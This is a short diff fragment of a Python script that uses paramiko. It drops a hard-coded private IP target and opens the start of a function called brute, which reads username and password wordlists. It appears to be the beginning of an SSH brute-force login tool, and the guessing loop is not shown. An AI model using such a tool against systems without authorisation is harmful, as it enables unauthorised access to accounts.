@@ -2,7 +2,6 @@
 
 import paramiko
 
-obj = '192.168.1.130'
 def brute(obj):
     usrs = open('/tmp/amanda/user-pass/users.txt')
     passwd = open('/tmp/amanda/user-pass/pass.txt')
